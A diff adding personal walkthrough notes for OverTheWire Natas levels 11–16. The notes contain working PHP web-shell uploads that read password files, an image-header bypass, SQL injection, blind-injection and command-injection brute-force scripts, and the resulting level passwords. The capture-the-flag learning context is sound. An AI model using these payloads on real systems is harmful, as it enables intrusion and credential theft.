@@ -485,6 +485,7 @@ HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=
 ```
 
 array ^ key = data
+
 key = array ^ data 
 
 
@@ -525,11 +526,518 @@ Cookies are protected with XOR encryption<br/><br/>
 The password for natas12 is yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB<br>
 ```
 
+
 # Level 11 -> 12:
+abs@MacBookPro OverTheWire % curl "natas12.natas.labs.overthewire.org/" -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB -s
+```
+<body>
+<h1>natas12</h1>
+<div id="content">
+
+<form enctype="multipart/form-data" action="index.php" method="POST">
+<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
+<input type="hidden" name="filename" value="hzxjlqm5f1.jpg" />
+Choose a JPEG to upload (max 1KB):<br/>
+<input name="uploadedfile" type="file" /><br />
+<input type="submit" value="Upload File" />
+</form>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+index-source.html:
+```
+<?php
+
+function genRandomString() {
+    $length = 10;
+    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
+    $string = "";
+
+    for ($p = 0; $p < $length; $p++) {
+        $string .= $characters[mt_rand(0, strlen($characters)-1)];
+    }
+
+    return $string;
+}
+
+function makeRandomPath($dir, $ext) {
+    do {
+    $path = $dir."/".genRandomString().".".$ext;
+    } while(file_exists($path));
+    return $path;
+}
+
+function makeRandomPathFromFilename($dir, $fn) {
+    $ext = pathinfo($fn, PATHINFO_EXTENSION);
+    return makeRandomPath($dir, $ext);
+}
+
+if(array_key_exists("filename", $_POST)) {
+    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
+
+
+        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
+        echo "File is too big";
+    } else {
+        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
+            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
+        } else{
+            echo "There was an error uploading the file, please try again!";
+        }
+    }
+?>
+
+<form enctype="multipart/form-data" action="index.php" method="POST">
+<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
+<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
+Choose a JPEG to upload (max 1KB):<br/>
+<input name="uploadedfile" type="file" /><br />
+<input type="submit" value="Upload File" />
+</form>
+<?php } ?>
+```
+
+Let's create a php file, that will read the "/etc/natas_webpass/natas13":
+
+abs@MacBookPro OverTheWire % cat > nani.php <<'EOF'
+```
+<?php
+echo shell_exec("cat /etc/natas_webpass/natas13");
+?>
+EOF
+```
+
+abs@MacBookPro OverTheWire % curl "natas12.natas.labs.overthewire.org/" -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB -s -F "filename=nani.php" -F "uploadedfile=@nani.php"
+```
+...
+<h1>natas12</h1>
+<div id="content">
+The file <a href="upload/9kxythwuv7.php">upload/9kxythwuv7.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+abs@MacBookPro OverTheWire % curl "natas12.natas.labs.overthewire.org/upload/9kxythwuv7.php" -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB -s                              
+```
+trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
+```
+
+
 # Level 12 -> 13:
+
+abs@MacBookPro OverTheWire % curl "natas13.natas.labs.overthewire.org/" -u natas13:trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC -s 
+```
+...
+<h1>natas13</h1>
+<div id="content">
+For security reasons, we now only accept image files!<br/><br/>
+
+
+<form enctype="multipart/form-data" action="index.php" method="POST">
+<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
+<input type="hidden" name="filename" value="460bkiwv0q.jpg" />
+Choose a JPEG to upload (max 1KB):<br/>
+<input name="uploadedfile" type="file" /><br />
+<input type="submit" value="Upload File" />
+</form>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+```
+
+index-source.html:
+```
+<?php
+
+function genRandomString() {
+    $length = 10;
+    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
+    $string = "";
+
+    for ($p = 0; $p < $length; $p++) {
+        $string .= $characters[mt_rand(0, strlen($characters)-1)];
+    }
+
+    return $string;
+}
+
+function makeRandomPath($dir, $ext) {
+    do {
+    $path = $dir."/".genRandomString().".".$ext;
+    } while(file_exists($path));
+    return $path;
+}
+
+function makeRandomPathFromFilename($dir, $fn) {
+    $ext = pathinfo($fn, PATHINFO_EXTENSION);
+    return makeRandomPath($dir, $ext);
+}
+
+if(array_key_exists("filename", $_POST)) {
+    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
+
+    $err=$_FILES['uploadedfile']['error'];
+    if($err){
+        if($err === 2){
+            echo "The uploaded file exceeds MAX_FILE_SIZE";
+        } else{
+            echo "Something went wrong :/";
+        }
+    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
+        echo "File is too big";
+    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
+        echo "File is not an image";
+    } else {
+        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
+            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
+        } else{
+            echo "There was an error uploading the file, please try again!";
+        }
+    }
+} else {
+?>
+
+<form enctype="multipart/form-data" action="index.php" method="POST">
+<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
+<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
+Choose a JPEG to upload (max 1KB):<br/>
+<input name="uploadedfile" type="file" /><br />
+<input type="submit" value="Upload File" />
+</form>
+<?php } ?>
+```
+
+
+Same as the prev level, but I actually need to convince it that my file is an image...
+From https://www.php.net/manual/en/function.exif-imagetype.php:
+"When a correct signature is found, the appropriate constant value will be returned otherwise the return value is false"
+So it's not checking the extension, but the header's magic...
+According to wiki, the magic is "FF D8 FF EE".
+
+abs@MacBookPro OverTheWire % echo '\xFF\xD8\xFF' > nani.php && cat >> nani.php <<'EOF'
+```
+<?php
+echo shell_exec("cat /etc/natas_webpass/natas14");
+?>
+EOF
+```
+
+abs@MacBookPro OverTheWire % curl "natas13.natas.labs.overthewire.org/" -u natas13:trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC -s -F "filename=nani.php" -F "uploadedfile=@nani.php" | grep php
+```
+The file <a href="upload/gavovcbgos.php">upload/gavovcbgos.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+```
+
+abs@MacBookPro OverTheWire % curl "natas13.natas.labs.overthewire.org/upload/gavovcbgos.php" -u natas13:trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC -s 
+```
+???
+z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
+```
+
+
 # Level 13 -> 14:
+abs@MacBookPro OverTheWire % curl "natas14.natas.labs.overthewire.org/" -u natas14:z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ -s  
+```
+...
+<h1>natas14</h1>
+<div id="content">
+
+<form action="index.php" method="POST">
+Username: <input name="username"><br>
+Password: <input name="password"><br>
+<input type="submit" value="Login" />
+</form>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+```
+
+index-source.html:
+```
+<?php
+if(array_key_exists("username", $_REQUEST)) {
+    $link = mysqli_connect('localhost', 'natas14', '<censored>');
+    mysqli_select_db($link, 'natas14');
+
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
+    if(array_key_exists("debug", $_GET)) {
+        echo "Executing query: $query<br>";
+    }
+
+    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
+            echo "Successful login! The password for natas15 is <censored><br>";
+    } else {
+            echo "Access denied!<br>";
+    }
+    mysqli_close($link);
+} else {
+?>
+
+<form action="index.php" method="POST">
+Username: <input name="username"><br>
+Password: <input name="password"><br>
+<input type="submit" value="Login" />
+</form>
+<?php } ?>
+```
+
+SQL lesgooo
+
+Let's see how the query is actually looks like:
+
+abs@MacBookPro OverTheWire % curl "natas14.natas.labs.overthewire.org/index.php?debug=1" -u natas14:z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ -s -F "username=art" -F "password=vandelay"
+```
+...
+<h1>natas14</h1>
+<div id="content">
+Executing query: SELECT * from users where username="art" and password="vandelay"<br>Access denied!<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+```
+
+abs@MacBookPro OverTheWire % curl "natas14.natas.labs.overthewire.org/index.php?debug=1" -u natas14:z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ -s -F "username=Vandelay\" OR 0=0 -- \""
+```
+...
+<b>Notice</b>:  Undefined index: password in <b>/var/www/natas/natas14/index.php</b> on line <b>19</b><br />
+Executing query: SELECT * from users where username="Vandelay" OR 0=0 -- "" and password=""<br>Successful login! The password for natas15 is SdqIqBsFcz3yotlNYErZSZwblkm0lrvx<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+```
+
+
 # Level 14 -> 15:
+abs@MacBookPro OverTheWire % curl "natas15.natas.labs.overthewire.org/" -u natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx -s                                     
+```
+<h1>natas15</h1>
+<div id="content">
+
+<form action="index.php" method="POST">
+Username: <input name="username"><br>
+<input type="submit" value="Check existence" />
+</form>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+```
+
+index-source.html:
+```
+<?php
+
+/*
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+);
+*/
+
+if(array_key_exists("username", $_REQUEST)) {
+    $link = mysqli_connect('localhost', 'natas15', '<censored>');
+    mysqli_select_db($link, 'natas15');
+
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+    if(array_key_exists("debug", $_GET)) {
+        echo "Executing query: $query<br>";
+    }
+
+    $res = mysqli_query($link, $query);
+    if($res) {
+    if(mysqli_num_rows($res) > 0) {
+        echo "This user exists.<br>";
+    } else {
+        echo "This user doesn't exist.<br>";
+    }
+    } else {
+        echo "Error in query.<br>";
+    }
+
+    mysqli_close($link);
+} else {
+?>
+
+<form action="index.php" method="POST">
+Username: <input name="username"><br>
+<input type="submit" value="Check existence" />
+</form>
+<?php } ?>
+```
+
+
+abs@MacBookPro OverTheWire % curl "natas15.natas.labs.overthewire.org/index.php?debug=1" -u natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx -s -F "username=natas16"
+```
+...
+<h1>natas15</h1>
+<div id="content">
+Executing query: SELECT * from users where username="natas16"<br>This user exists.<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+```
+
+
+
+abs@MacBookPro OverTheWire % curl "natas15.natas.labs.overthewire.org/index.php?debug=1" -u natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx -s -F "username=natas15\" OR 0=0 --\""
+```
+...
+<h1>natas15</h1>
+<div id="content">
+Executing query: SELECT * from users where username="natas15" OR 0=0 --""<br>This user exists.<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+```
+
+Brute-forcing the password:
+```
+#!/bin/bash
+
+CHARS="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+PASS_LEN=32
+URL="natas15.natas.labs.overthewire.org/index.php"
+LOGIN="natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"
+PASS=""
+
+for pos in $(seq 1 $PASS_LEN); do
+	for char in $(echo $CHARS | fold -w1); do
+		OUT=$(curl $URL -u $LOGIN -s -F "username=natas16\" AND BINARY SUBSTRING(password,$pos,1)=\"$char\" -- \"" | grep "This user exists" | wc -l)
+		if [ "$OUT" -eq 1 ]; then
+			PASS+=$char
+			echo "pass so far: $PASS"
+			break
+		fi
+	done
+done
+
+echo "Password for natas16: $PASS"
+```
+
+abs@MacBookPro OverTheWire % chmod +x brute_force_natas15.sh 
+
+abs@MacBookPro OverTheWire % ./brute_force_natas15.sh 
+```
+Password for natas16: hpkjkyvilqctew33qmuxl6edvfmw4sgo
+```
+
+IF FAILS!!! because it's all LC?! fml
+
+Added BINARY infront if SUBSTRING for binary conversion before comp..
+abs@MacBookPro OverTheWire % ./brute_force_natas15.sh 
+```
+Password for natas16: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
+```
+
+
 # Level 15 -> 16:
+abs@MacBookPro OverTheWire % curl "natas16.natas.labs.overthewire.org/" -u natas16:hPkjKYviLQctEW33QmuXL6eDVfMW4sGo -s
+```
+<h1>natas16</h1>
+<div id="content">
+
+For security reasons, we now filter even more on certain characters<br/><br/>
+<form>
+Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
+</form>
+
+
+Output:
+<pre>
+</pre>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+```
+
+index-source.html:
+```
+Output:
+<pre>
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    if(preg_match('/[;|&`\'"]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i \"$key\" dictionary.txt");
+    }
+}
+?>
+```
+
+
+I have an awful idea...
+
+abs@MacBookPro OverTheWire % curl "natas16.natas.labs.overthewire.org/" -u natas16:hPkjKYviLQctEW33QmuXL6eDVfMW4sGo -s -d "needle=\$(grep 3 /etc/natas_webpass/natas17)hello&submit="
+```
+Output:
+<pre>
+hello
+hello's
+hellos
+</pre>
+```
+
+Let's do some scripting:
+```
+#!/bin/bash
+
+CHARS="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+URL="natas16.natas.labs.overthewire.org"
+LOGIN="natas16:hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"
+PASS=""
+
+for char in $(echo $CHARS | fold -w1); do
+	OUT=$(curl $URL -u $LOGIN -s -d "needle=\$(grep $char /etc/natas_webpass/natas17)hello&submit=" | grep "hellos" | wc -l)
+	if [ "$OUT" -eq 0 ]; then
+		PASS+=$char
+		echo "pass so far: $PASS"
+	fi
+done
+
+echo "Password for natas16: $PASS"
+```
+
+The chars used in the password are:
+
+abs@MacBookPro OverTheWire % ./brute_force_natas16.sh
+```
+Password for natas16: bhjkoqsvwCEFHJLNOT05789
+```
+
+I need to know what is the first char in the passowrd, so I could bruteforce it...
+
+abs@MacBookPro OverTheWire % curl "natas16.natas.labs.overthewire.org/" -u natas16:hPkjKYviLQctEW33QmuXL6eDVfMW4sGo -s -d "needle=\$(cut -c 1 /etc/natas_webpass/natas17)&submit=" | grep  -x .
+```
+E
+```
+
+So, it is either e or E, but the chars are bhjkoqsvwCEFHJLNOT05789 so it starts with E !!!
+
+Let's do the bruteforcing:
+```
+#!/bin/bash
+
+CHARS="bhjkoqsvwCEFHJLNOT05789"
+URL="natas16.natas.labs.overthewire.org"
+LOGIN="natas16:hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"
+PASS="E"
+PASS_LEN=31
+
+
+for pos in $(seq 1 $PASS_LEN); do
+	for char in $(echo $CHARS | fold -w1); do
+		TMP=$PASS
+		TMP+=$char
+		OUT=$(curl $URL -u $LOGIN -s -d "needle=\$(grep $TMP /etc/natas_webpass/natas17)hello&submit=" | grep "hellos" | wc -l)
+		if [ "$OUT" -eq 0 ]; then
+			PASS+=$char
+			echo "pass so far: $PASS"
+			break
+		fi
+	done
+done
+
+echo "Password for natas16: $PASS"
+```
+
+abs@MacBookPro OverTheWire % ./brute_force_natas16_2.sh 
+```
+Password for natas16: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
+```
+
 # Level 16 -> 17:
 # Level 17 -> 18:
 # Level 18 -> 19:
